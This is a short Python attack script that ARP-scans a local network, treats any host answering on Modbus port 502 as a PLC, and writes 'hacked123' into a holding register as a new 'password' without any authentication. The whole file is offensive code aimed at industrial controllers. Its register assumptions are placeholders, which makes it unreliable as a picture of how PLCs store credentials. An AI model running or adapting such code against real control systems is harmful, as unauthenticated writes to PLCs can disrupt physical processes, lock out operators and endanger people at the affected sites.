import time
from scapy.all import ARP, Ether, srp
from pyModbusTCP.client import ModbusClient


# Function to find PLC IP address via ARP scan
def find_plc_ip(network_range="192.168.1.0/24"):
    print("[*] Scanning network to find PLC IP...")
    request = Ether(dst="ff:ff:ff:ff:ff:ff") / ARP(pdst=network_range)
    answered, _ = srp(request, timeout=2, verbose=False)

    for sent, received in answered:
        print(f"[*] Found device: {received.psrc} - {received.hwsrc}")
        if is_plc(received.psrc):
            print(f"[+] PLC Found at IP: {received.psrc}")
            return received.psrc
    
    print("[-] No PLC found.")
    return None


# Function to verify if a device is a PLC (Basic check via Modbus connection)
def is_plc(ip):
    client = ModbusClient(host=ip, port=502, timeout=3)
    if client.open():
        client.close()
        return True
    return False


# Function to change PLC password
def change_plc_password(plc_ip, old_password="default", new_password="hacked123"):
    print(f"[*] Connecting to PLC at {plc_ip} to change password...")

    # Simulating connection - Adjust based on PLC vendor
    client = ModbusClient(host=plc_ip, port=502, timeout=3)
    
    if client.open():
        print("[+] Connected to PLC successfully.")
        
        # Simulating writing new password to memory registers (Adjust based on vendor details)
        new_password_encoded = [ord(c) for c in new_password]
        
        # Assume password is stored at Modbus register 40001
        success = client.write_multiple_registers(40001, new_password_encoded)
        
        if success:
            print(f"[+] Successfully changed PLC password to: {new_password}")
        else:
            print("[-] Failed to change password.")

        client.close()
    else:
        print(f"[-] Could not connect to PLC at {plc_ip}.")


# Main Execution
if __name__ == "__main__":
    plc_ip = find_plc_ip()

    if plc_ip:
        change_plc_password(plc_ip)
    else:
        print("[-] Unable to locate PLC. Exiting.")